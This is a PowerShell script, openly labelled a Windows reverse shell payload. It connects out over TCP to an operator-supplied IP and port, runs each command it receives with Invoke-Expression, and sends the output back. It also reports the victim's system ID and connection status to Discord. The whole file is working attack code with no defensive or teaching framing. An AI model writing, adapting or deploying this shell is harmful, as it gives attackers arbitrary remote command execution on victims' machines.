# ============================================================
# Reverse Shell for Windows - Modular Remote Payload
# ============================================================
# Requires: $env:IP and $env:PT
# ============================================================

$sysid = Get-SystemID

if (-not $env:IP -or -not $env:PT) {
    Send-Discord "❌ Reverse shell failed on $sysid - Missing IP or PORT"
    return
}

Send-Discord "🔌 **Reverse Shell Initiated**`nTarget: $sysid`nConnecting to: $($env:IP):$($env:PT)"

try {
    $client = New-Object System.Net.Sockets.TCPClient($env:IP, [int]$env:PT)
    $stream = $client.GetStream()
    [byte[]]$bytes = 0..65535 | ForEach-Object { 0 }
    
    $sendback = "PS " + (Get-Location).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
    
    while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
        try {
            $output = (Invoke-Expression $data 2>&1 | Out-String)
        } catch {
            $output = $_.Exception.Message
        }
        $sendback = $output + "PS " + (Get-Location).Path + "> "
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback)
        $stream.Write($sendbyte, 0, $sendbyte.Length)
        $stream.Flush()
    }
    
    $client.Close()
} catch {
    Send-Discord "❌ Shell connection failed: $($_.Exception.Message)"
}
